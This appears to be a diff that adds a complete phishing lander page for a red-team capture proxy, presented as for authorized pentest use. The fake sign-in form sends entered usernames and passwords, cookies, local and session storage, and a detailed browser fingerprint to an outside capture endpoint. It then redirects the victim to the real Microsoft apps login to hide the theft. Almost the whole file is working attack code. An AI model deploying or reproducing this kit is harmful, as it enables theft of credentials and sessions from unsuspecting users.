@@ -1,0 +1,235 @@
+<!doctype html>
+<!--
+  Example credential-capture lander for /api/capture/external.
+
+  Authorized red-team / pentest use only. The bearer token is embedded in
+  page source — anyone viewing source can read it, so use a single-purpose
+  token and rotate it after the engagement.
+
+  Hosting:
+    - Same-origin (drop into the proxy's static/ tree and serve from
+      :8091 / :8092)         — no CORS setup needed.
+    - Cross-origin (host on a separate believable domain) — the proxy
+      currently has no CORS allowlist; the preflight will be blocked.
+      Add a CORS config key first.
+
+  Config — edit the CONFIG block below for the engagement:
+    site_id        the cred key prefix; pick something memorable
+    token          must match config.external_capture_token on the proxy
+    endpoint       URL of POST /api/capture/external
+    next_url       where the victim is redirected on submit (typically
+                   the real login URL so the flow looks unbroken)
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Sign in</title>
+  <style>
+    body { font: 14px/1.4 system-ui, sans-serif; background: #f5f6f8;
+           display: grid; place-items: center; min-height: 100vh; margin: 0; }
+    .card { background: #fff; padding: 32px; border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,.08); width: 320px; }
+    h1 { font-size: 18px; margin: 0 0 18px; }
+    label { display: block; font-size: 12px; color: #555; margin-top: 12px; }
+    input { width: 100%; padding: 8px; border: 1px solid #ccc;
+            border-radius: 2px; box-sizing: border-box; }
+    button { margin-top: 20px; width: 100%; padding: 10px;
+             background: #0078d4; color: #fff; border: none;
+             border-radius: 2px; cursor: pointer; font-size: 14px; }
+    .err { color: #b00; font-size: 12px; margin-top: 8px; min-height: 16px; }
+  </style>
+</head>
+<body>
+  <form class="card" id="f">
+    <h1>Sign in</h1>
+    <label>Email or username</label>
+    <input id="u" name="username" type="text" autocomplete="username" required>
+    <label>Password</label>
+    <input id="p" name="password" type="password" autocomplete="current-password" required>
+    <button type="submit">Sign in</button>
+    <div class="err" id="e"></div>
+  </form>
+
+<script>
+// Load FingerprintJS from CDN with error handling
+window.FingerprintJSLoaded = false;
+(function() {
+  const script = document.createElement('script');
+  script.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/js@3/dist/fp.min.js';
+  script.async = true;
+  script.onload = function() {
+    window.FingerprintJSLoaded = true;
+    console.log('FingerprintJS loaded successfully');
+  };
+  script.onerror = function() {
+    console.warn('FingerprintJS failed to load from CDN');
+    window.FingerprintJSLoaded = true; // Mark as loaded to unblock form
+    window.FingerprintJS = null;
+  };
+  document.head.appendChild(script);
+})();
+</script>
+<script>
+const CONFIG = {
+  site_id:  "lander-demo",
+  token:    "test_external_capture_token",
+  // IMPORTANT: Update this to your proxy server's actual address
+  // Examples:
+  //   "http://192.168.1.50:8092/api/capture/external" (local network)
+  //   "https://proxy.yourcompany.com/api/capture/external" (public domain)
+  //   "http://localhost:8092/api/capture/external" (local testing)
+  endpoint: "https://example.com/api/capture/external",
+  next_url: "https://myapps.microsoft.com/",
+};
+
+async function fingerprint() {
+  const fp = {
+    user_agent: navigator.userAgent,
+    languages:  navigator.languages || [navigator.language],
+    platform:   navigator.platform,
+    vendor:     navigator.vendor,
+    hw_concurrency: navigator.hardwareConcurrency || null,
+    device_memory:  navigator.deviceMemory || null,
+    screen:    { w: screen.width, h: screen.height,
+                 aw: screen.availWidth, ah: screen.availHeight,
+                 color_depth: screen.colorDepth, dpr: window.devicePixelRatio },
+    viewport:  { w: innerWidth, h: innerHeight },
+    timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer:  document.referrer,
+    page_url:  location.href,
+  };
+
+  // Wait for FingerprintJS to load from CDN (max 10 seconds)
+  let waitTime = 0;
+  while (!window.FingerprintJSLoaded && waitTime < 10000) {
+    await new Promise(r => setTimeout(r, 100));
+    waitTime += 100;
+  }
+
+  // Capture FingerprintJS detailed fingerprint if available
+  if (typeof FingerprintJS !== 'undefined' && FingerprintJS !== null) {
+    try {
+      // 5 second timeout for FingerprintJS
+      const fpPromise = (async () => {
+        const fpjs = await FingerprintJS.load();
+        return await fpjs.get();
+      })();
+      const timeoutPromise = new Promise((_, reject) =>
+        setTimeout(() => reject(new Error('FingerprintJS timeout')), 5000)
+      );
+      const result = await Promise.race([fpPromise, timeoutPromise]);
+      fp.fingerprint_id = result.visitorId;
+      fp.fingerprint_confidence = result.confidence?.score || null;
+      fp.fingerprint_components = result.components;
+    } catch (e) {
+      fp.fingerprint_error = e.message;
+      console.warn('FingerprintJS error:', e.message);
+    }
+  } else {
+    console.log('FingerprintJS not available (waited', waitTime, 'ms)');
+  }
+  // Sec-CH-UA-* client hints — the proxy's :3128 capture path reads these
+  // server-side; mirror them client-side so a lander capture has the same
+  // signal as an in-band one.
+  if (navigator.userAgentData) {
+    try {
+      fp.ua_data = await navigator.userAgentData.getHighEntropyValues([
+        "architecture","bitness","model","platformVersion",
+        "uaFullVersion","fullVersionList","wow64",
+      ]);
+    } catch (_) { /* ignore */ }
+  }
+  // Optional WebGL renderer (vendor/renderer often distinguish device class).
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (gl) {
+      const ext = gl.getExtension("WEBGL_debug_renderer_info");
+      if (ext) {
+        fp.webgl = {
+          vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
+        };
+      }
+    }
+  } catch (_) { /* ignore */ }
+  return fp;
+}
+
+function readStorage(s) {
+  const o = {};
+  try { for (let i=0; i<s.length; i++) { const k=s.key(i); o[k]=s.getItem(k); } } catch(_) {}
+  return o;
+}
+
+function readCookies() {
+  // Same-origin cookies only — third-party cookies are unreachable from JS.
+  return (document.cookie || "").split(";").map(p => p.trim()).filter(Boolean).map(p => {
+    const i = p.indexOf("=");
+    return { name: p.slice(0, i), value: p.slice(i+1),
+             domain: location.hostname };
+  });
+}
+
+document.getElementById("f").addEventListener("submit", async (ev) => {
+  ev.preventDefault();
+  const u = document.getElementById("u").value;
+  const p = document.getElementById("p").value;
+  const err = document.getElementById("e");
+  err.textContent = "";
+
+  const body = {
+    site_id: CONFIG.site_id,
+    user: u,
+    username: u,
+    password: p,
+    source_url: location.href,
+    cookies: readCookies(),
+    local_storage: readStorage(localStorage),
+    session_storage: readStorage(sessionStorage),
+    captured_inputs: {
+      fingerprint: await fingerprint(),
+      request_headers: {
+        "User-Agent": navigator.userAgent,
+        "Accept-Language": navigator.language || "unknown",
+        "Accept": "application/json",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Cache-Control": "no-cache",
+        "Content-Type": "application/json",
+        "Origin": location.origin,
+        "Referer": location.href,
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "cross-site",
+        "Authorization": "Bearer [REDACTED]",
+      }
+    },
+    notes: "lander capture",
+  };
+
+  try {
+    const r = await fetch(CONFIG.endpoint, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer " + CONFIG.token,
+      },
+      body: JSON.stringify(body),
+      // keepalive lets the request finish even if we navigate away below.
+      keepalive: true,
+    });
+    if (!r.ok) {
+      err.textContent = "We couldn't sign you in. Please try again.";
+      return;
+    }
+  } catch (e) {
+    err.textContent = "Network error. Please try again.";
+    return;
+  }
+  // Hand the victim off to the real flow so the experience looks unbroken.
+  location.href = CONFIG.next_url;
+});
+</script>
+</body>
+</html>
